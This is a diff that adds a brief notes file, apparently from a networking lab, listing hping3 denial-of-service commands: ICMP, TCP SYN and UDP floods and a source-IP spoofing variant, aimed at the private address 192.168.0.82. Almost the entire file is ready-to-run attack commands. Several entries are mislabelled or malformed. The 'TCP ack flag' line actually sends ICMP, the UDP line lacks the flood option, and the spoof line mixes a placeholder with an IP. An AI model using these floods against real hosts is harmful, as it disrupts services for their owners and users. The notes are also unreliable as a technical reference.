@@ -1,0 +1,25 @@
+--flood (many request to send a same time)
+ ipconfig -all
+ 192.168.0.82
+ 
+ --flood apo to dos Attack thai
+icmp
+sudo hping3 -1  192.168.0.82 
+windows click ->wireshark
+
+icmp slood
+many request to send a same time
+sudo hping3 -1  192.168.0.82 --flood
+
+TCPflood
+sudo hping3 -S  192.168.0.82 --flood
+
+UDP flood
+sudo hping3 -2  192.168.0.82 
+
+TCP ack flag
+sudo hping3 -1  192.168.0.82 
+
+
+change(spoof) a ip address(response leva mate)
+sudo hping3 -S  192.168.0.82  -a </ip address of kali linux> 10.176.253.67
